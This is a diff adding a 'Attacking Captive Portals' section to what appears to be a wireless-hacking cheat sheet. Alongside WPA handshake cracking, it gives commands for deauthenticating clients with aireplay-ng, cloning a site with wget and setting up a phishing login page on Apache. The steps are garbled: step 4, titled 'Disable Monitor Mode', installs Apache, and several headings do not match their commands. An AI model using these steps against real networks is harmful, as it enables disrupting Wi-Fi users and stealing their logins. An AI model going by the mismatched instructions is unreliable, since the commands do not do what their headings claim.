@@ -261,6 +261,74 @@ aircrack-ng name.hccapx -e ESSID -w /wordlist/rockyou.txt
 hashcat -m 2500 capture.hccapx /usr/share/worlists/rockyou.txt
 ```
 
+## Attacking Captive Portals
+
+This guide provides step-by-step instructions for setting up a wireless network monitoring and attack environment.
+
+### 1. Set Interface to Monitor Mode
+
+Begin by capturing information about clients and access points (APs) around you:
+
+```bash
+sudo airodump-ng wlan0mon
+```
+
+### 2. Adjust the Capture
+
+To specify the capture details, use:
+
+```bash
+sudo airodump-ng -w fileName –output-format pcap -c channelnumber interface
+```
+
+### 3. De-authenticate Connected Devices
+
+Wait until the WPA handshake is captured:
+
+```bash
+sudo aireplay-ng -0 amountOfdeauths -a ApBSSID interface
+```
+
+### 4. Disable Monitor Mode
+
+After completing the capture, disable monitor mode:
+
+```bash
+sudo apt install apache2 libapache2-mod-php
+```
+
+### 5. Download the Example Page
+
+Use `wget` to download the webpage. Here, `-l2` means to go 2 levels deep:
+
+```bash
+wget -r -l2 https://www.website.com
+```
+
+### 6. Prepare the Web Directory
+
+Create a directory for the phishing webpage:
+
+```bash
+sudo mkdir /var/www/html/portal && sudo mousepad /var/www/html/portal/index.php
+```
+
+### 7. Replicate the Website's Style
+
+Replicate the styling of the example website page and copy the assets:
+
+```bash
+sudo cp -r ./www.website.com/assets /var/www/html/portal
+```
+
+### 8. Set Up the Login Page
+
+Configure the login page to redirect to `login_check.php`:
+
+```bash
+sudo mousepad /var/www/html/portal/login_check.php
+```
+
 ## Information Discovery Example
 ```bash
 - ESSID of JesusIsTheWay
